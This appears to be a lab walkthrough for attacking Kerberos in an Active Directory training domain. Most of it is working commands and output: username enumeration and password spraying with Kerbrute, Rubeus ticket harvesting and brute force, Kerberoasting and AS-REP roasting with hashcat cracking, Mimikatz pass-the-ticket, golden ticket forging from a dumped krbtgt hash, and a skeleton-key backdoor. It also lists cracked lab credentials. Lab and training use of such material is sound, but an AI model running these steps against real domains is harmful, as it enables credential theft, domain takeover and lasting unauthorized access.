## ENUMERATION WITH KERBRUTE
```bash
# Kerbrute - Source
https://github.com/ropnop/kerbrute/releases

# Wordlist used for username bruteforce
https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt

# Usage of tool kerbrute
sudo ./kerbrute userenum -d CONTROLLER.local ./User.txt --dc $ip
2025/04/25 04:06:23 >  [+] VALID USERNAME:       administrator@CONTROLLER.local
2025/04/25 04:06:23 >  [+] VALID USERNAME:       admin1@CONTROLLER.local
2025/04/25 04:06:23 >  [+] VALID USERNAME:       admin2@CONTROLLER.local
2025/04/25 04:06:25 >  [+] VALID USERNAME:       user1@CONTROLLER.local
2025/04/25 04:06:25 >  [+] VALID USERNAME:       machine1@CONTROLLER.local
2025/04/25 04:06:25 >  [+] VALID USERNAME:       httpservice@CONTROLLER.local
2025/04/25 04:06:25 >  [+] VALID USERNAME:       user2@CONTROLLER.local
2025/04/25 04:06:25 >  [+] VALID USERNAME:       machine2@CONTROLLER.local
2025/04/25 04:06:25 >  [+] VALID USERNAME:       sqlservice@CONTROLLER.local
2025/04/25 04:06:25 >  [+] VALID USERNAME:       user3@CONTROLLER.local
```
## HARVESTING AND BRUTE-FORCING TICKETS WITH RUBEUS
```bash
# Note
Harvesting gathers tickets that are being transferred to the KDC and saves them for use in other attacks such as the pass the ticket attack.

# Credentials
Password: P@$$W0rd 
Domain: controller.local

# Password Spray
sudo ./kerbrute passwordspray -d CONTROLLER.local ./validusernames 'P@$$W0rd' --dc $ip
2025/04/25 04:15:38 >  [+] VALID LOGIN:  administrator@CONTROLLER.local:P@$$W0rd

# Credentials
administrator:P@$$W0rd

# ssh 
sudo ssh administrator@$ip

controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>.\Rubeus.exe harvest /interval:30            

# add the domain controller domain name to the windows host file
echo 10.10.44.26 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts

# Passwod Spray
Rubeus.exe brute /password:Password1 /noticket

[-] Blocked/Disabled user => Guest
[-] Blocked/Disabled user => krbtgt
[+] STUPENDOUS => Machine1:Password1
[*] base64(Machine1.kirbi):
      doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyi
      JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIubG9jYWyjggQDMIID/6ADAgESoQMCAQKiggPx
      BIID7aF6RfaEZSdpQqugjU6VA5861/PeZsUfWxaP0HtDd9i3HEtrpSkB+Z6FQ62+l0fH/8rCgTwDiLIC
      g/sKJEkvDNaxqlV74h+YY2gK234WMJeFXylg08QXZbiC3e7XKy2ZGz9JfZsnRHdooa3+zChZxdlUM11Y
      cl/1XkwqGzElgZTf1caQuFlxQ5k1Y79QbXy0oEpeO3opiyZNrfXchuaoO3WME3/uYPrzuMZRw17wyIQg
      YlGlfAq+gfeXja/shRog8JlizjJF9ioP2IBQiYcuPuoT+Kz44TIQuA9KMS3eamIDZrzLFcc7dEaAUtsn
      ezDPhqSapXk/3lUUeBlDjbpc5uSKGd9rwz2DZlsDcZG9fWWQFxpEym7PRMsDU6wAFfwpzr5yzoSQ8L2X
      ByqLly8ajINOLTSKPhF4+j/keK2DsFmkKrUz9bv1Hx7VOl0Skx0NkIUWOckdvOaOWNad/hRz8pf0awcm
      hnSmv/dtO4P9R27yncM9WzeqBAEzSCU9q115SZiqleJKDD7Pil+oaVC7m3a6ZZ0e50viCe0s9hOVF2At
      F077lbSVjdOIP6X9uY7ymbMvJHZwGox36uFSBaG6oSXitpnT689LODzZUW+fGDWz/uMkBupN+oBP2ia/
      6tHLA0L8v6sje1mrzavS84LRaqQg3xRy3YIlo0Fzjj3u2eVB1F1juDs/H4BUkwWe5c28TbgTvst3ruB4
      U6bCtK7RhHkGZo+VC7kPMEf4jCkqMI+kXEftxiHKDiWOIZeNeUs83WjnoJ5WNwhWgDG9AlesQGPxYY18
      sx8TRDZV9A9iCOccWQ3YfElLsXq/ipTTgISfiTZCB3MydT9+cTC+tztx1KtVjCF/3A4E42hC8qwhpjJ9
      hEvUZzYVpiy/7mbDQkggpj5HMnJuTv42viflbUCx54DRJOG4z6KS+WOIDkxm7NTQXoQ9WjF+4SiPyVxU
      VI4+JDqLrQXcZ4Y76nUeD0s+4wkp/ak2vPEMlzA1AYkb94SI0yJLhJabkWZQZ99GRXA/+XkhWlLurzsf
      UbhlFy0d/wqujaZJjm9oxMgQYYEUQd1AdrD4/vVRck//1xld2smV6fDbeL+iRwd6Cxi8ctCkQQdj+0yh
      7zKvB6TJRue814jGzfXTHlu8A4n9NNugpv8vbDTllqLJGUT6HuuUbRQpM9gnSUFtxjYOxwSK0xGc4CDp
      A2MZJVQ5/l+Ev8CJ97uMx4EI6E38ARSr0pZN+xUHz+w4ykjSuD7pbz6KKQXyZq39tUD4DUSt+UNcBONC
      yjBGEm8L+I8wykoRrummwCU9KfzUF45ra8Vzn7gQofT4CdIhu82G4eEo/586P8y4PqOB8jCB76ADAgEA
      ooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEIOml63Jqp0YX1GGzfRzfBvbzOjZz7rcJSS24
      9uE312zZoRIbEENPTlRST0xMRVIuTE9DQUyiFTAToAMCAQGhDDAKGwhNYWNoaW5lMaMHAwUAQOEAAKUR
      GA8yMDI1MDQyNDIyNTEzOVqmERgPMjAyNTA0MjUwODUxMzlapxEYDzIwMjUwNTAxMjI1MTM5WqgSGxBD
      T05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLmxvY2Fs
[+] Done

# Credentials
Machine1:Password1
```
## KERBEROASTING WITH RUBEUS AND IMPACKET
### METHOD I - RUBEUS
```bash
# Dump Kerberoas hash of any kerberoastable users 
Rubeus.exe kerberoast

- Copy the SQLService and HTTPService hash
- Remove space for proper hash
- 
cat rawsqlservice.hash | tr -d " \t\n\r" > sqlservice.hash
cat rawhttpservice.hash | tr -d " \t\n\r" > httpservice.hash

# Cracking the hashes
hashcat.exe -m 13100 -a 0 rawhash.txt Pass.txt

# Credentials
SQLService:MYPassword123#
HTTPService:Summer2020
```
### METHOD II - IMPACKET
```bash
sudo impacket-GetUserSPNs CONTROLLER.local/Machine1:Password1 -dc-ip CONTROLLER.local -request

- Copy the hashes

# Cracking the hashes
hashcat.exe -m 13100 -a 0 rawhash.txt Pass.txt

# Credentials
SQLService:MYPassword123#
HTTPService:Summer2020
```
## AS-REP ROASTING WITH RUBEUS
```bash
# Note
Very similar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled.
Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled.

# Dumping Hashes
Rubeus.exe asreproast

- Copy the hashes

# Remove spaces
cat asrepraw.admin2hash |  tr -d " \t\n\r" > admin2.asrephash
cat asrepraw.user3hash |  tr -d " \t\n\r" > user3.asrephash

# Note
Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User

# Crack the hashes
hashcat.exe -m 18200 rawhash.txt Pass.txt

# Credentials
Admin2:P@$$W0rd2
User3:Password3
```
## PASS THE TICKET WITH MIMIKATZ
```bash
- Transfer mimikatz.exe

# Run mimikatz.exe
mimikatz.exe

# Ensure this outputs [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz
mimikatz # privilege::debug  
Privilege '20' OK

# this will export all of the .kirbi tickets into the directory that you are currently in
mimikatz # sekurlsa::tickets /export
mimikatz # exit

- To impersonate I would recommend looking for an administrator ticket from the krbtgt 

# Pass the Ticket with mimikatz
mimikatz # kerberos::ptt [0;18b44a]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi 

* File: '[0;18b44a]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi': OK
mimikatz # exit

# Verifying that we successfully impersonated the ticket by listing our cached tickets.
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>klist
Current LogonId is 0:0x18b44a
Cached Tickets: (3)
#0>     Client: Administrator @ CONTROLLER.LOCAL
        Server: krbtgt/CONTROLLER.LOCAL @ CONTROLLER.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 4/24/2025 15:46:32 (local)
        End Time:   4/25/2025 1:46:32 (local)
        Renew Time: 5/1/2025 15:46:32 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:

#1>     Client: Administrator @ CONTROLLER.LOCAL
        Server: CONTROLLER-1/HTTPService.CONTROLLER.local:30222 @ CONTROLLER.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 4/24/2025 15:54:10 (local)
        End Time:   4/25/2025 1:46:32 (local)
        Renew Time: 5/1/2025 15:46:32 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called: CONTROLLER-1

#2>     Client: Administrator @ CONTROLLER.LOCAL
        Server: CONTROLLER-1/SQLService.CONTROLLER.local:30111 @ CONTROLLER.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 4/24/2025 15:54:10 (local)
        End Time:   4/25/2025 1:46:32 (local)
        Renew Time: 5/1/2025 15:46:32 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called: CONTROLLER-1

# Verify by accesing admin share or based on your scenario
```
## GOLDEN/SILVER TICKET ATTACKS WITH MIMIKATZ
```bash
- Transfer mimikatz.exe

# Run mimikatz.exe
mimikatz.exe

# Ensure this outputs [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz
mimikatz # privilege::debug  
Privilege '20' OK

# This will dump the hash as well as the security identifier needed to create a Golden Ticket. 
# To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.
mimikatz # lsadump::lsa /inject /name:krbtgt

# Create Golden/Silver Ticket - Copy SID, NTLM and  id is sid of the service account
mimikatz # Kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-432953485-3795405108-1502158860 /krbtgt:72cd714611b64cd4d5550cd2759db3f6 /id:500

# User the Golden/Silver Ticket to access other Machines
mimikatz # misc::cmd

# Access Machines you want based on the Ticket you used

# Dump More hashes
mimikatz # lsadump::lsa /inject /name:SQLService
mimikatz # lsadump::lsa /inject /name:Administrator
```
## KERBEROS BACKDOORS WITH MIMIKATZ
```bash
# The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. 
# A skeleton key only works using Kerberos RC4 encryption. 

- Transfer mimikatz.exe

# Run mimikatz.exe
mimikatz.exe

# Ensure this outputs [output '20' OK] if it does not that means you do not have the administrator privileges to properly run mimikatz
mimikatz # privilege::debug  
Privilege '20' OK

# Installing the skeleton key woth mimikatz
mimikatz # misc::skeleton
[KDC] data 
[KDC] struct
[KDC] keys patch OK
[RC4] functions
[RC4] init patch OK
[RC4] decrypt patch OK

# Accessing the forest 
- The default credentials will be: "mimikatz"
- example: 
	- net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz 
	- The share will now be accessible without the need for the Administrators password
- example: 
	- dir \\Desktop-1\c$ /user:Machine1 mimikatz 
	- access the directory of Desktop-1 without ever knowing what users have access to Desktop-1

- The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques however that is out of scope for this room.
```